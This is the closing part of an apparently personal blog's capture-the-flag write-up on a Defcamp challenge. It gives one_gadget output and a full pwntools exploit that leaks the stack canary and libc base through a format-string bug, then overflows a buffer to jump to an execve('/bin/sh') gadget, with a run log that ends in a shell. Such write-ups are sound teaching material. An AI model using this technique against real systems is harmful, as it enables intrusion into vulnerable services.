<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">ldd</span> <span class="no">q3</span>
</span></span><span class="line"><span class="cl">	<span class="nf">linux-vdso.so.1</span> <span class="p">(</span><span class="mi">0x00007ffff7ffa000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nf">libc.so.6</span> <span class="err">=&gt;</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6</span> <span class="p">(</span><span class="mi">0x00007ffff77e2000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="err">/</span><span class="nf">lib64</span><span class="err">/</span><span class="no">ld-linux-x86-64.so.2</span> <span class="p">(</span><span class="mi">0x00007ffff7dd5000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">one_gadget</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x4f2c5</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">rcx</span> <span class="err">==</span> <span class="no">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x4f322</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x10a38c</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x70</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x70</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
</span></span></code></pre></div><p>I&rsquo;ll be using the first one <code>0x4f2c5</code>. Now, it&rsquo;s time to pwn:-</p>
<h3 id="final-exploit" class="relative group">Final Exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#final-exploit" aria-label="Anchor">#</a></span></h3><p>We have almost everything, now it&rsquo;s time for final exploit:-</p>
<p>Here&rsquo;s the idea, I&rsquo;ll be using the format string specifier to leak canary and libc address and then use the stack canary value to send the payload and using the libc address offset we will get the one_gadget address and we are done.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># stack canary is at offset 11 for format string</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It is at offset 24 for buffer overflow</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BINARY</span> <span class="o">=</span> <span class="s1">&#39;./q3&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./q3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Leak stack canary (offset 11) and the libc address (offset 3)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%11$lx-%3$lx&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">leaks</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># Stack Canary</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x110154</span>  <span class="c1"># LIBC offset we found earlier </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;canary: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f2c5</span> <span class="c1"># using one_gadget </span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;one_gadget: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">24</span> <span class="c1"># Write up to the stack canary</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">)</span> <span class="c1"># Ensure we don&#39;t change the stack canary</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># Overwrite RBP to reach upto RIP</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="c1"># Overwrite RIP with pre-made shell</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit we will get shell:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">python</span> <span class="no">q3_exp.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Full</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">9550</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">canary:</span> <span class="err">0</span><span class="nf">x648678ab45c48e00</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">libc</span> <span class="no">base</span><span class="p">:</span> <span class="mi">0x7ffff79e4000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">one_gadget:</span> <span class="err">0</span><span class="nf">x7ffff7a332c5</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
</span></span><span class="line"><span class="cl"><span class="nf">core</span>                 <span class="no">libc.so.6</span>       <span class="no">q3_exp.py</span>  <span class="no">q3.til</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">9550</span><span class="p">)</span>
</span></span></code></pre></div><p>That was it folks, took more than I thought it would but we made it.</p>
<p>I hope you enjoyed it and learned something today. If you encountered any problem or anything relevant contact me on <a href="https://twitter.com/d4mianwayne" target="_blank" rel="noreferrer">twitter</a></p>

    </section>
    <footer class="pt-8">
      
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/fmt-bof/&amp;quote=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Share on Facebook"
          aria-label="Share on Facebook"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://x.com/intent/tweet/?url=http://localhost:1313/posts/fmt-bof/&amp;text=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Post on X"
          aria-label="Post on X"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/posts/fmt-bof/&amp;description=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Pin on Pinterest"
          aria-label="Pin on Pinterest"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://reddit.com/submit/?url=http://localhost:1313/posts/fmt-bof/&amp;resubmit=true&amp;title=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Submit to Reddit"
          aria-label="Submit to Reddit"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/fmt-bof/&amp;title=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Share on LinkedIn"
          aria-label="Share on LinkedIn"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="mailto:?body=http://localhost:1313/posts/fmt-bof/&amp;subject=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Send via email"
          aria-label="Send via email"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.threads.net/intent/post?text=http://localhost:1313/posts/fmt-bof/%20Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Post on Threads"
          aria-label="Post on Threads"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M331.5 235.7c2.2 .9 4.2 1.9 6.3 2.8c29.2 14.1 50.6 35.2 61.8 61.4c15.7 36.5 17.2 95.8-30.3 143.2c-36.2 36.2-80.3 52.5-142.6 53h-.3c-70.2-.5-124.1-24.1-160.4-70.2c-32.3-41-48.9-98.1-49.5-169.6V256v-.2C17 184.3 33.6 127.2 65.9 86.2C102.2 40.1 156.2 16.5 226.4 16h.3c70.3 .5 124.9 24 162.3 69.9c18.4 22.7 32 50 40.6 81.7l-40.4 10.8c-7.1-25.8-17.8-47.8-32.2-65.4c-29.2-35.8-73-54.2-130.5-54.6c-57 .5-100.1 18.8-128.2 54.4C72.1 146.1 58.5 194.3 58 256c.5 61.7 14.1 109.9 40.3 143.3c28 35.6 71.2 53.9 128.2 54.4c51.4-.4 85.4-12.6 113.7-40.9c32.3-32.2 31.7-71.8 21.4-95.9c-6.1-14.2-17.1-26-31.9-34.9c-3.7 26.9-11.8 48.3-24.7 64.8c-17.1 21.8-41.4 33.6-72.7 35.3c-23.6 1.3-46.3-4.4-63.9-16c-20.8-13.8-33-34.8-34.3-59.3c-2.5-48.3 35.7-83 95.2-86.4c21.1-1.2 40.9-.3 59.2 2.8c-2.4-14.8-7.3-26.6-14.6-35.2c-10-11.7-25.6-17.7-46.2-17.8H227c-16.6 0-39 4.6-53.3 26.3l-34.4-23.6c19.2-29.1 50.3-45.1 87.8-45.1h.8c62.6 .4 99.9 39.5 103.7 107.7l-.2 .2zm-156 68.8c1.3 25.1 28.4 36.8 54.6 35.3c25.6-1.4 54.6-11.4 59.5-73.2c-13.2-2.9-27.8-4.4-43.4-4.4c-4.8 0-9.6 .1-14.4 .4c-42.9 2.4-57.2 23.2-56.2 41.8l-.1 .1z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://telegram.me/share/url?text=http://localhost:1313/posts/fmt-bof/&amp;url=Binary%20Exploitation%20-%20Format%20String%20&#43;%20Buffer%20Overflow%20Vulnerability"
          title="Share on Telegram"
          aria-label="Share on Telegram"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
</span></a
        >
      
    
  </section>


    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex list-none flex-col sm:flex-row">
        
          
          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
            
              <a
                href="/tags/"
                title=""
                
                ><span
                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                    >Tags</span
                  >
                </a
              >
            
          </li>
        
      </ul>
    </nav>
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            Copy, <em>right?</em> 🤔
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
        <div
          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        >
          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
            <div
              class="flex h-12 w-12 items-center justify-center dark:hidden"
              title="Switch to dark appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
            </div>
            <div
              class="hidden h-12 w-12 items-center justify-center dark:flex"
              title="Switch to light appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
            </div>
          </button>
        </div>
      
    </div>
  </div>
  
  
</footer>
<div
  id="search-wrapper"
